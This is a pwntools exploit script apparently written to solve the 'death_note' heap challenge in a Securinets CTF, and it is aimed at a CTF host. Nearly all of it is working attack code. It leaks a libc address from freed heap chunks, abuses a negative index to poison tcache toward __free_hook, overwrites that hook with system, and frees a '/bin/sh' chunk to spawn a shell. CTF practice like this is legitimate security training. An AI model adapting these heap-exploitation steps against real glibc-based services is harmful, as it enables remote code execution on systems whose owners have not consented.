#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'bin.q21.ctfsecurinets.com', 1337
binary = './death_note'
brkpts = '''
'''

elf = ELF("death_note")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla("Exit\n", str(idx))

def add(size):
    choice(1)
    sla("size:", str(size))
    return rl().split()[-1]

def edit(idx, data):
    choice(2)
    sla("index: ", str(idx))
    sa("Name: ", str(data))

def free(idx):
    choice(3)
    sla("index: ", str(idx))

def view(idx):
    choice(4)
    sla("index: ", str(idx))

if __name__ == "__main__":
    for i in range(8):
        add(0x90)

    for i in range(8, -1, -1):
        free(i)

    for i in range(8):
        add(0x90)

    edit(0, "/bin/sh\x00")
    edit(7, "a"*8)
    view(7)
    re(8)
    libc.address = u64(io.recv(6).ljust(8,"\x00")) - 0x3ebca0
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']

    add(0x20)
    free(8)

    edit(-65, p64(free_hook))

    add(0x20)
    add(0x20)
    edit(9, p64(system))

    free(0)

    io.interactive()
